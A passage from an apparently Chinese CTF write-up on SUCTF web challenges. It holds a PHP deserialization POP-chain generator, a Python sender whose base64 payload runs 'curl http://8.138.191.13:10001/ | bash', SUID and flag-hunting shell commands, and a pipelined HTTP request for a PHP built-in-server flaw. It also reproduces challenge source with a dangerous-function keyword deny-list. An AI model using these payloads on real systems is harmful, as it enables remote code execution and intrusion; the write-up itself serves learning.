class="string">&quot;generate&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_loaded = [<span class="string">&quot;KC1zs4&quot;</span> =&gt; <span class="keyword">new</span> <span class="title class_">MockClass</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Table</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_behaviors</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_behaviors = <span class="keyword">new</span> <span class="title class_">BehaviorRegistry</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">Http</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Table</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$stream</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;stream = <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">React</span>\<span class="title class_">Promise</span>\<span class="title class_">Internal</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RejectedPromise</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$reason</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;reason = <span class="keyword">new</span> <span class="title class_">Response</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">RejectedPromise</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;hello kc1zs4&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></li><li><p>python payload脚本</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:10021&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### /ser</span></span><br><span class="line">path_ser = <span class="string">&quot;/ser&quot;</span></span><br><span class="line">ser_params = &#123;</span><br><span class="line">    <span class="string">&quot;ser&quot;</span>: <span class="string">&quot;TzozODoiUmVhY3RcUHJvbWlzZVxJbnRlcm5hbFxSZWplY3RlZFByb21pc2UiOjE6e3M6NjoicmVhc29uIjtPOjE4OiJDYWtlXEh0dHBcUmVzcG9uc2UiOjE6e3M6Njoic3RyZWFtIjtPOjE0OiJDYWtlXE9STVxUYWJsZSI6MTp7czoxMDoiX2JlaGF2aW9ycyI7TzoyNToiQ2FrZVxPUk1cQmVoYXZpb3JSZWdpc3RyeSI6Mjp7czoxMDoiX21ldGhvZE1hcCI7YToxOntzOjY6InJld2luZCI7YToyOntpOjA7czo2OiJLQzF6czQiO2k6MTtzOjg6ImdlbmVyYXRlIjt9fXM6NzoiX2xvYWRlZCI7YToxOntzOjY6IktDMXpzNCI7Tzo0ODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxHZW5lcmF0b3JcTW9ja0NsYXNzIjoyOntzOjk6ImNsYXNzQ29kZSI7czo0OToic3lzdGVtKCdjdXJsIGh0dHA6Ly84LjEzOC4xOTEuMTM6MTAwMDEvIHwgYmFzaCcpOyI7czo4OiJtb2NrTmFtZSI7czo2OiJLQzF6czQiO319fX19fQ==&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.get(host + path_ser, params=ser_params, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li><li><p>进入shell</p><ol><li>找一下flag，<code>find / -name *flag*</code></li><li>find suid提权一波带走: <code>ls -al</code>，<code>find / -user root -perm -4000</code>，<code>find . -exec cat /*flag* \;</code></li><li>SUCTF{PoP_CHaiN5_@Re_SO_fUn!!!}</li></ol></li></ol></li></ol><h2 id="SU-photogallery"><a href="#SU-photogallery" class="headerlink" title="SU_photogallery"></a>SU_photogallery</h2><h3 id="SU-photogallery-环境配置"><a href="#SU-photogallery-环境配置" class="headerlink" title="SU_photogallery 环境配置"></a>SU_photogallery 环境配置</h3><ol><li>老样子<code>docker-compose build</code></li><li>修改一下想要的端口(在docker-compose里)，然后<code>docker-compose up -d</code></li></ol><h3 id="SU-photogallery-分析-SV"><a href="#SU-photogallery-分析-SV" class="headerlink" title="SU_photogallery 分析 | SV"></a>SU_photogallery 分析 | SV</h3><ol><li>上传需要是zip和图片，会不会有unzip</li><li>可以知道是php写的，上传一下也没有好信息，报错也杯ban掉了，至少需要unzip文件怎么样啊bro</li><li>这里应该是要尝试读一下文件<ol><li>测信道？有些函数有啊，但是这里没有输入纯靠路由吗？zip或许先移动到&#x2F;tmp&#x2F;下？然后再解压？，直接再zip这里测信道吗 Nop!</li></ol></li></ol><h3 id="SU-photogallery-复现-SV"><a href="#SU-photogallery-复现-SV" class="headerlink" title="SU_photogallery 复现 | SV"></a>SU_photogallery 复现 | SV</h3><blockquote><p>初见杀了55</p></blockquote><ol><li><p>提取信息：测试+php，使用的是php Server(这里真是nb，写的是容易配的环境，很明显是题眼)，目的至少要读到文件，需要找相关的漏洞</p><ol><li>php Server漏洞，有[<a href="https://blog.csdn.net/Kawakaze_JF/article/details/133046885]">https://blog.csdn.net/Kawakaze_JF/article/details/133046885]</a></li><li>bp发包(要关掉content-length自动添加)<ol><li>这里python受到了局限，需要用bp，下面是bp试图，\r\n是bp中显示出来的</li></ol></li><li>注意点<ol><li>这里需要使用kc1zs4.txt，不能是kc1zs4&#x2F;文件夹，也不能是php文件，文章里也有说</li></ol></li></ol> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /unzip.php HTTP/1.1\r\n</span><br><span class="line">Host: 127.0.0.1:5000\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /kc1zs4.txt HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure></li><li><p>代码审计</p><ol><li>这里其实只需要上传一个php文件然后访问执行即可getshell</li><li>现在的问题在于上传的文件extract出来后会重命名，爆破有点逆天了？还有别的方法吗(想不到了55)<ol><li>idea1(其实就是idea3嘻嘻): extractTo()是一个一个解压还是啥，这里失败后并没有返回，后续仍然会移动到upload&#x2F;suimages&#x2F;下</li><li>idea2: 软连接，似乎可以用..&#x2F;l来绕过吧，可以本地试试，php这个函数似乎有版本限制，试的话要挺久，搜不到再回来试一试吧</li><li>idea3: 找找资料: php zip ctf[<a href="https://ucasers.cn/zip%E5%9C%A8CTF-web%E6%96%B9%E5%90%91%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95]%EF%BC%8C%E8%BF%99%E7%AF%87%E6%90%9CextractTo()%EF%BC%8Ctitle-9%E8%BF%99%E9%87%8C%E7%9A%84%E6%8F%8F%E8%BF%B0%E5%BE%88%E7%AC%A6%E5%90%88%EF%BC%8Cok%E7%9A%84%EF%BC%8C%E6%8A%A5%E9%94%99%E7%9A%84%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%96%87%E4%BB%B6%E5%90%8D%E5%81%9A%E6%96%87%E7%AB%A0">https://ucasers.cn/zip在CTF-web方向中的一些用法]，这篇搜extractTo()，title-9这里的描述很符合，ok的，报错的也可以文件名做文章</a></li><li>idea4: 再check_extension和file_rename中使得unlink出错保留下来文件emm</li></ol></li></ol> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Nbc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2025-01-13 16:13:46</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@LastEditors</span>: Nbc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@LastEditTime</span>: 2025-01-13 16:31:53</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@FilePath</span>: \src\unzip.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Copyright (c) 2025 by Nbc, All Rights Reserved. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_extension</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_extension</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filePath</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">get_extension</span>(<span class="variable">$filename</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不能上传图片</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">unlink</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;Fail to delete file: $filename\n&quot;;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// echo &quot;This file format is not supported:$extension\n&quot;;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// echo &quot;nofile&quot;;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_rename</span> (<span class="params"><span class="variable">$path</span>,<span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$randomName</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>().<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">99999</span>)) . <span class="string">&#x27;.&#x27;</span> . <span class="title function_ invoke__">get_extension</span>(<span class="variable">$file</span>);</span><br><span class="line">                <span class="variable">$oldPath</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$file</span>;</span><br><span class="line">                <span class="variable">$newPath</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$randomName</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 随机名称，但是还是可以爆破来的，目录的话有点难搞</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">rename</span>(<span class="variable">$oldPath</span>, <span class="variable">$newPath</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$file</span>);</span><br><span class="line">                    <span class="comment">// echo &quot;Fail to rename file: $file\n&quot;;</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move_file</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$basePath</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">glob</span>(<span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;*&#x27;</span>) <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$destination</span> = <span class="variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);   <span class="comment">// 这个是可控的</span></span><br><span class="line">        <span class="comment">// 移动文件到指定目录</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">rename</span>(<span class="variable">$file</span>, <span class="variable">$destination</span>))&#123;</span><br><span class="line">            <span class="comment">// echo &quot;Fail to rename file: $file\n&quot;;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_base</span>(<span class="params"><span class="variable">$fileContent</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;phar&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;DOCTYPE&#x27;</span>, <span class="string">&#x27;iconv&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;hex2bin&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;function&#x27;</span>, <span class="string">&#x27;pcntl_exec&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;call_user_func&#x27;</span>, <span class="string">&#x27;getallheaders&#x27;</span>, <span class="string">&#x27;get_defined_vars&#x27;</span>,<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line">    <span class="variable">$base64_keywords</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$keyword</span>) &#123;</span><br><span class="line">        <span class="variable">$base64_keywords</span>[] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$keyword</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$base64_keywords</span> <span class="keyword">as</span> <span class="variable">$base64_keyword</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$fileContent</span>, <span class="variable">$base64_keyword</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_content</span>(<span class="params"><span class="variable">$zip</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$zip</span>-&gt;numFiles; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$fileInfo</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">statIndex</span>(<span class="variable">$i</span>);</span><br><span class="line">        <span class="variable">$fileName</span> = <span class="variable">$fileInfo</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.(\/|\.|%2e%2e%2f)/i&#x27;</span>, <span class="variable">$fileName</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">// echo &quot;Checking file: $fileName\n&quot;;</span></span><br><span class="line">            <span class="variable">$fileContent</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">getFromName</span>(<span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 似乎可以拼接，base64的也过滤了</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i&#x27;</span>, <span class="variable">$fileContent</span>) || <span class="title function_ invoke__">check_base</span>(<span class="variable">$fileContent</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;Don&#x27;t hack me!\n&quot;;    </span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unzip</span>(<span class="params"><span class="variable">$zipname</span>, <span class="variable">$basePath</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是想要phar吗？用于执行命令的话，似乎不行</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$zipname</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Zip file does not exist&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;zip_not_found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$zipname</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Fail to open zip file&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;zip_open_failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">check_content</span>(<span class="variable">$zip</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;malicious_content_detected&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 无法竞争，只能穿越？</span></span><br><span class="line">    <span class="variable">$randomDir</span> = <span class="string">&#x27;tmp_&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>().<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">99999</span>));</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="variable">$randomDir</span>;</span><br><span class="line">    <span class="comment">// 可以执行，可是访问不到啊</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>, <span class="number">0777</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Fail to create directory&quot;;</span></span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;mkdir_failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 内置的函数</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;Fail to extract zip file&quot;;</span></span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 当且仅当提取成功时，才会检查文件</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$zip</span>-&gt;numFiles; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$fileInfo</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">statIndex</span>(<span class="variable">$i</span>);</span><br><span class="line">            <span class="variable">$fileName</span> = <span class="variable">$fileInfo</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">check_extension</span>(<span class="variable">$fileName</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;Unsupported file extension&quot;;</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">file_rename</span>(<span class="variable">$path</span>, <span class="variable">$fileName</span>)) &#123;</span><br><span class="line">                <span class="comment">// echo &quot;File rename failed&quot;;</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 作用：移动文件到指定目录</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">move_file</span>(<span class="variable">$path</span>, <span class="variable">$basePath</span>)) &#123;</span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="comment">// echo &quot;Fail to move file&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;move_failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">rmdir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;    <span class="comment">// return true的一定走完了全流程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$uploadDir</span> = <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;upload/suimages/&#x27;</span>;    <span class="comment">// DIRECTORY_SEPARATOR是常量</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0777</span>, <span class="literal">true</span>);  <span class="comment">// 可执行可上传</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 